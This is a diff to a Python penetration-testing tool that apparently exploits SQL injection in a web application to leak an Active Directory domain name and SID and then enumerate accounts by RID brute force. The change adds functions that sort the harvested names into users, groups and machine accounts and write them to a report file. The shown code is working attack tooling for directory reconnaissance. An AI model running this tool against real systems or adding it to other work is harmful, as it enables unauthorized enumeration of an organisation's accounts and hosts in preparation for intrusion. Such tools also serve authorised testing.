@@ -278,7 +278,6 @@ def parse_request(request_file,protocol):
         cookies = None
         for header in headers:
             if b"cookies:" in header or b"Cookies:" in header:
-                 print(header)
                  header_string = str(header)[:-5]
                  cookie_values = str(header_string).split(':')[1]
                  cookies = dict(x.split('=') for x in cookie_values.split(';'))
@@ -348,7 +347,7 @@ def extract_sid(method,url,content_type,body,domain,column_number,column_type,da
 
 #Enumerate for AD users given a range
 def enum_users(method,url,content_type,body,domain,column_number,column_type,data,parameter,time_delay,sid,rid_range,encoding,proxies,cookies):
-    print("[+] Enumerating users...")
+    print("[+] Enumerating Active Directory via SIDs...")
     
     max_rid = rid_range.split("-")[1]
     min_rid = rid_range.split("-")[0]
@@ -378,12 +377,9 @@ def enum_users(method,url,content_type,body,domain,column_number,column_type,dat
 
         if domain in determinant:
             username = str(re.search(rf"(?<=W00TW00T)(.+?)(?=W00TW00T)",determinant).group())
-            print(username.strip("\""))
             users_list.append(username)
         sleep(time_delay)
   
-
-    print("\n[!] Finished!")
     return users_list
 
 #Logic to determine the number of columns and the type of data that can be used.
@@ -494,6 +490,40 @@ def leak_domain_name(method,url,content_type,body,column_number,column_type,data
     
     return leaked_domain
 
+# Additional enumeration and reporting functions
+#===========================================================================================
+
+def check4machines(all_results):
+    print("[+] Determining network hosts...")
+    machines = []
+    for i in all_results:
+        if i[-1] == "$":
+            print(i)
+            machines.append(i)
+    print("\n")
+    return machines
+
+def check4groups(all_results):
+    print("[+] Determining groups...")
+    groups = []
+    for i in all_results:
+        if " " in i:
+            print(i)
+            groups.append(i)
+    print("\n")
+    return groups
+
+def check4users(all_results):
+    print("[+] Determining users...")
+    users = []
+    for i in all_results:
+        if " " in i or i[-1] == "$":
+            pass
+        else:
+            print(i)
+            users.append(i)
+    print("\n")
+    return users
 
 #Main function
 #===========================================================================================
@@ -515,12 +545,26 @@ def main(encoding,time_delay,sid_range,parameter,request_file,data,ssl,proxy,out
     
     sid = extract_sid(method,url,content_type,body,domain,column_number,column_type,data,parameter,encoding,proxies,cookies)
 
-    results = enum_users(method,url,content_type,body,domain,column_number,column_type,data,parameter,time_delay,sid,rid_range,encoding,proxies,cookies)
+    all_results = enum_users(method,url,content_type,body,domain,column_number,column_type,data,parameter,time_delay,sid,rid_range,encoding,proxies,cookies)
+
+    user_results = check4users(all_results)
+    machine_results = check4machines(all_results)
+    group_results = check4groups(all_results)
 
     if outfile:
         f = open(outfile,'w')
-        for i in results:
+        f.write("")
+        f.write("[+] Users:\n")
+        for i in user_results:
             f.write(str(i)+'\n')
+        f.write("\n")
+        f.write("[+] Groups:\n")
+        for j in group_results:
+            f.write(str(j)+'\n')  
+        f.write("\n")
+        f.write("[+] Hosts:\n")
+        for k in machine_results:
+            f.write(str(k)+'\n')    
         f.close()
 
 
@@ -528,3 +572,4 @@ if __name__ == '__main__':
    
     encoding,time_delay,rid_range,parameter,request_file,data,ssl,proxy,outfile = get_args()
     main(encoding,time_delay,rid_range,parameter,request_file,data,ssl,proxy,outfile)
+    print("\n[!] Finished!\n")
